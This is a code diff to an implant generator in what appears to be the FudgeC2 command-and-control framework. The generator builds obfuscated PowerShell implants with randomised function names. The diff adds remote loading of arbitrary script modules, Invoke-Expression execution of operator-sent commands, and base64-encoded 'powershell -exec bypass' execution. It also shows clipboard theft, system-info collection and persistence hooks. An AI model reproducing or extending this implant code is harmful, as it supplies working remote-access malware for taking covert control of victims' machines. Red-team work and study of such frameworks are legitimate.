@@ -26,8 +26,11 @@ class ImplantGenerator:
         "obf_callback_url": "url",
         "obf_callback_reason": "callback_reason",
         "obf_get_clipboard": "export-clipboard",
-        "obf_load_module":"download-file",
-        "obf_upload_file":"upload-file"
+        "obf_load_module": "load-ext-module",
+        "obf_invoke_module": "invoke-module",
+        "obf_get_loaded_modules": "get-loaded-modules",
+        "obf_upload_file": "upload-file",
+        "obf_download_file": "download-file"
         }
 
     # -- This is to be finished with PoC WorkWork audio
@@ -43,7 +46,7 @@ function {{ ron.obf_get_clipboard }}() {
     $b = "Text"
     $a = Get-Clipboard -Format $b
     if ($a -ne $null ){$Script:tr = $a}
-    else {$Script:tr = "No clipboard data"}
+    else {$Script:tr = "No clipboard data."}
 }
 '''
 
@@ -60,16 +63,40 @@ function {{ ron.obf_collect_sysinfo }}(){
     random_function = '''
 function {{ ron.rnd_function }} () {}
 '''
-    load_module ='''
-# Loading external scripts  
+
+    load_module = '''
+function {{ ron.obf_load_module }} ($data) {
+    $b = $data
+    $data = $b -split '::', 2
+    $name = $data[0].Replace(" ","")
+    $bgt = $data[1]
+    $b = [ScriptBlock]::Create($bgt)
+    New-Module -ScriptBlock $b -Name FC2-ReturnResult | Import-Module
+    $Script:tr = Get-Command -Module FC2
+}
 '''
 
-    upload_file ='''
-# Uploading files to client
+    invoke_commands = '''
+function {{ ron.obf_invoke_module }} ($data) {
+    $Script:tr = invoke-expression "$data"
+}
+'''
+
+    get_loaded_modules = '''
+function {{ ron.obf_get_loaded_modules }} () {
+    $Script:tr = Get-Command | Where {$_.Source -Like "FC2"}
+}
+'''
+
+    upload_file = '''
+# Uploading files to client - Not yet implemented
+function {{ ron.obf_upload_file }} () {}
 '''
 
     download_file = '''
-# Download files from client
+# Download files from client - Not yet implemented
+function {{ ron.obf_download_file }} () {}
+
 '''
 
     # -- This needs improvement, it only supports http persistence.
@@ -96,7 +123,8 @@ function {{ ron.obf_builtin_command }}($data){
         $b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($data.Substring(2)))
     }
     if($a -eq "CM"){
-        $Script:tr = powershell.exe -exec bypass -C "$b"
+        $c = [System.Convert]::ToBase64String([system.Text.Encoding]::Unicode.getbytes($b))
+        $Script:tr = powershell.exe -exec bypass -EncodedCommand $c
     } elseif($a -eq "SI"){
         {{ ron.obf_collect_sysinfo }}
     } elseif ($a -eq "EP"){
@@ -105,6 +133,12 @@ function {{ ron.obf_builtin_command }}($data){
         {{ ron.obf_remote_play_audio }}($b)
     } elseif ($a -eq "EC"){ 
         {{ ron.obf_get_clipboard }} 
+    } elseif ($a -eq "LM"){
+        {{ ron.obf_load_module }}($b)
+    } elseif ($a -eq "IM"){
+        {{ ron.obf_invoke_module }}($b)
+    } elseif ($a -eq "ML"){
+        {{ ron.obf_get_loaded_modules }}  
     } else {
         $Script:tr = "0"
     }
@@ -236,23 +270,28 @@ while($true){
     def _process_modules(self, implant_data, randomised_function_names):
         # --  New in Dwarven Blacksmith
         # Add default functions to added to the implant which will be randomised.
-        implant_functions = [self.play_audio,
-                             self.random_function,
-                             self.execute_command,
-                             self.fde_func_a,
-                             self.fde_func_b,
-                             self.create_persistence,
-                             self.select_protocol,
-                             self.load_module,
-                             self.upload_file,
-                             self.download_file]
+        implant_functions = [
+            self.play_audio,
+            self.random_function,
+            self.execute_command,
+            self.fde_func_a,
+            self.fde_func_b,
+            self.create_persistence,
+            self.select_protocol,
+            self.load_module,
+            self.invoke_commands,
+            self.get_loaded_modules
+            ]
+    # The following functions need to be added once they have been finalised.
+    # self.upload_file
+    # self.download_file
 
         # Checks which protocols should be embedded into the implant.
         if implant_data['comms_http'] is not None:
             implant_functions.append(self.http_function)
         if implant_data['comms_https'] is not None:
             implant_functions.append(self.https_function)
-        # TODO: These protocols will be delivered in later iterations of FudgeC2
+        # TODO: These protocols will be delivered in later version of FudgeC2
         # if id['comms_dns'] != None:
         #     implant_functions.append(self.https_function)
         # if id['comms_binary'] != None:
